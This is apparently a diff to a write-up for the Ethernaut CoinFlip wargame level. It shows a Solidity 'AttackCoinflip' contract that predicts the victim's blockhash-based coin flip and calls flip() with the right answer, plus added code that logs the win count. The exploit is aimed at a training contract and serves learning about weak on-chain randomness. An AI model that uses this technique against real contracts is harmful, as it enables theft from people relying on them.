@@ -31,9 +31,10 @@ The goal of this level is to guess result of `side` correctly 10 times in a row.
 pragma solidity ^0.8.0;
 
 contract AttackCoinflip {
-    // Victim is address of smart contract you get instance of in Ethernauts.
-    address victim = 0x9010BCEbf802A031eabB52B22F3ec1331D923bBd;
+    address victim = 0x12048e11FE4a4719Afd46664db4475db1AAa0bC7;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    event Wins(uint number, string message);
 
     function attack() public {
         // This is the same algorithm that is used by the victim contract
@@ -49,7 +50,22 @@ contract AttackCoinflip {
         // to the source code of the contract you want to interact with.
         bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
         (bool success, ) = victim.call{value: 0 ether}(payload);
-        require(success, "Transaction call using encodeWithSignature is successful");
+
+        // This part is just used to retrieve current number of consecutiveWins and display it as event
+        bytes memory payload2 = abi.encodeWithSignature("consecutiveWins()", "");
+        (bool success2, bytes memory returnData) = victim.call{value: 0 ether}(payload2);
+        uint number = sliceUint(returnData, 0);
+        emit Wins(number, "Number of wins made");
+    }
+
+    // We added this to convert bytes to number
+    function sliceUint(bytes memory bs, uint start) internal pure returns (uint) {
+        require(bs.length >= start + 32, "slicing out of range");
+        uint x;
+        assembly {
+            x := mload(add(bs, add(0x20, start)))
+        }
+        return x;
     }
 }
 ```
